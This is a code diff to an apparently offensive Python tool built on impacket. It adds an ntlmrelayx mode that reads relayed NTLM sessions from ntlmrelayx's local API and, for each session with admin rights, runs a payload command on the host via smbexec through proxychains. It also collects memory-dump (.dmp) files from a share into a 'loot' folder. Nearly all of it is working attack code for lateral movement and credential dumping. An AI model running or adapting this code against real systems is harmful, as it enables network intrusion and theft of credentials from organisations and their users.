@@ -7,6 +7,7 @@ import cmd
 import time
 import nmap
 import glob
+import json
 import ntpath
 import socket
 import random
@@ -40,6 +41,11 @@ from impacket.ntlm import compute_lmhash, compute_nthash
 from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
+
+try:
+    from urllib.request import ProxyHandler, build_opener, Request
+except ImportError:
+    from urllib2 import ProxyHandler, build_opener, Request
 
 try:
     import apt
@@ -1597,40 +1603,7 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
-def get_size(path):
-    size = os.path.getsize(path)
-    if size < 1000:
-        return f"{size} bytes"
-    elif size < pow(1000, 2):
-        return f"{round(size / 1000, 2)} KB"
-    elif size < pow(1000, 3):
-        return f"{round(size / (pow(1000, 2)), 2)} MB"
-    elif size < pow(1000, 4):
-        return f"{round(size / (pow(1000, 3)), 2)} GB"
-
-def alt_exec_newfile_printer(): # im aware of the issue with getting the loop to exit at the end of the run youll just have to deal with pressing ctrl c
-    file_arr_hist = []
-    try:
-        while True:
-            file_arr = glob.glob('/var/tmp/{}/*.dmp'.format(share_name))
-            for file in file_arr:
-                orig_file = file
-                file = file[file.rfind('/')+1:]
-                if file not in file_arr_hist:
-                    file_arr_hist.append(file)
-                    printnlog('{}[+]{} New DMP file {} Size: {}'.format(color_BLU, color_reset, file, get_size(orig_file)))
-            time.sleep(3)
-
-    except KeyboardInterrupt:
-        pass
-
-def alt_exec():
-
-    thread1 = threading.Thread(target=alt_exec_newfile_printer)
-    thread1.start()
-
-    yes = input('Press enter to exit \n')
-
+def alt_exec_exit():
     try:  # move the share file to the loot dir
         os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
     except BaseException as e:
@@ -1689,6 +1662,129 @@ def alt_exec():
 
     print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
     sys.exit(0)
+
+
+def config_check():
+    fail = 0
+    sockfail = 0
+    printnlog('{}[{}Checking proxychains config{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
+    # this will get the location of the config file proxychains is using
+    proc = subprocess.run(['proxychains -h'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    dat = proc.stderr.decode().split('\n')
+
+    for line in dat:
+        if line.find('config file found') != -1:
+            config_file = line[line.find(':') + 2:]
+
+    try:
+        with open(config_file, 'r') as f:
+            dat = f.read()
+            f.close()
+
+        if dat.find('127.0.0.1 1080') == -1:
+            sockfail += 1
+
+    except FileNotFoundError as e:
+        fail += 1
+
+    if fail == 1:
+        printnlog('{} ERROR you are missing proxychains config'.format(red_minus))
+        alt_exec_exit()
+
+    if sockfail >= 1:
+        printnlog('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains config'.format(red_minus))
+        alt_exec_exit()
+
+    printnlog('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
+
+def get_size(path):
+    size = os.path.getsize(path)
+    if size < 1000:
+        return f"{size} bytes"
+    elif size < pow(1000, 2):
+        return f"{round(size / 1000, 2)} KB"
+    elif size < pow(1000, 3):
+        return f"{round(size / (pow(1000, 2)), 2)} MB"
+    elif size < pow(1000, 4):
+        return f"{round(size / (pow(1000, 3)), 2)} GB"
+
+def alt_exec_newfile_printer(): # im aware of the issue with getting the loop to exit at the end of the run youll just have to deal with pressing ctrl c
+    file_arr_hist = []
+    try:
+        while True:
+            file_arr = glob.glob('/var/tmp/{}/*.dmp'.format(share_name))
+            for file in file_arr:
+                orig_file = file
+                file = file[file.rfind('/')+1:]
+                if file not in file_arr_hist:
+                    file_arr_hist.append(file)
+                    printnlog('{}[+]{} New DMP file {} Size: {}'.format(color_BLU, color_reset, file, get_size(orig_file)))
+            time.sleep(3)
+
+    except KeyboardInterrupt:
+        pass
+
+def relayx_dump(reaper_command):
+    headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
+    url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
+    dumped_ips = []
+    try:
+        proxy_handler = ProxyHandler({})
+        opener = build_opener(proxy_handler)
+        response = Request(url)
+        r = opener.open(response)
+        result = r.read()
+
+        items = json.loads(result)
+    except Exception as e:
+        printnlog("ERROR: %s" % str(e))
+        if str(e).find('Connection refused') != -1:
+            printnlog('It appears that ntlmrelayx is not running its api on port 9090 try running it with -socks')
+    else:
+        if os.path.isfile('{}/hist'.format(cwd)):
+            with open('{}/hist'.format(cwd), 'r') as f:
+                ips = f.read()
+                dumped_ips = ips.split('\n')
+        if len(items) > 0:
+
+            tmp = result.decode()
+            tmp = tmp.replace('[', '')
+            tmp = tmp.replace('"', '')
+            tmp = tmp.replace('\n', '')
+            tmp = tmp.split('],')
+
+            # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
+
+            for item in tmp:
+                dat = item.replace(']', '').split(',')
+                if dat[3] == 'TRUE':
+                    if dat[1] not in dumped_ips:
+                        dumped_ips.append(dat[1])
+                        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, dat[2], dat[1], reaper_command))
+                        os.system('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, dat[2], dat[1], reaper_command))
+                        with open('{}/hist'.format(cwd), 'a') as f:
+                            f.write(str(dat[1]) + '\n')
+                            f.close()
+
+        else:
+            print('No Relays Available!')
+
+def alt_exec(relayx, reaper_command):
+    thread1 = threading.Thread(target=alt_exec_newfile_printer)
+    thread1.start()
+
+    if relayx:
+        printnlog('{} Executing {} via ntlmrelayx smbexec\n'.format(gold_plus, options.payload))
+        if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)) == False:
+            printnlog('{} ERROR Missing smbexec-shellless.py in {}/'.format(red_minus, cwd))
+            alt_exec_exit()
+        config_check()
+        relayx_dump(reaper_command)
+
+    yes = input('Press enter to exit \n')
+
+    alt_exec_exit()
 
 
 def exec_wmic(ip, domain):
@@ -1958,6 +2054,7 @@ if __name__ == '__main__':
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-sku', action='store_true', help='Skips the update check (good for if you do not have internet and dont want to wait for it to timeout)')
     parser.add_argument('-oe', action='store_true', default=False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
+    parser.add_argument('-relayx', action='store_true', help='Use ntlmrelayx relays for authentication')
     parser.add_argument('-ap', action='store_true', default=False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
     parser.add_argument('-av', action='store_true', default=False, help='Turn auto validation of found accounts ON this will try to authenticate to a domain controller using any usernames and NT hashes that were found (Requires -ap)')
     parser.add_argument('-sh', action='store_true', default=False, help='Skips any hosts that have been previously attacked. (Stored in hist file)')
@@ -2007,6 +2104,9 @@ if __name__ == '__main__':
 
     if options.debug:
         lognoprint('{}Command:{} '.format(color_PURP, color_reset) + ' '.join(sys.argv) + '\n')
+
+    if options.relayx and options.oe == False:
+        options.oe = True
 
     # Init the example's logger theme
     logger.init(options.ts)
@@ -2206,7 +2306,7 @@ if __name__ == '__main__':
         printnlog('')
 
         if options.oe:
-            alt_exec()
+            alt_exec(options.relayx, command)
 
         printnlog('Total targets: {}'.format(len(addresses)))
         # multithreading yeah
